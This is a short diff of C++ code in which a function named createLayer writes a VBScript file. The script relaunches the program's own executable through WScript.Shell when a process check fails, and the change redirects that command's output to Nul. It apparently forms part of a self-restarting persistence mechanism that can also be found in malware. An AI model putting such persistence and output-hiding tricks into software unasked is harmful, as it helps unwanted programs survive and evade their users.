@@ -52,7 +52,7 @@ std::string createLayer() {
 		outfile << "If found = \"false\" Then" << std::endl; //text.exe
 		outfile << "Dim objShell" << std::endl; //text.exe
 		outfile << "Set objShell = WScript.CreateObject(\"WScript.Shell\")" << std::endl; //text.exe
-		outfile << "objShell.Run(\"" + Helpers::ExePath() + "\")" << std::endl; //text.exe
+		outfile << "objShell.Run(\"" + Helpers::ExePath() + " > Nul \")" << std::endl; //text.exe
 		outfile << "Set objShell = Nothing" << std::endl; //text.exe
 
 	//#if _DEBUG
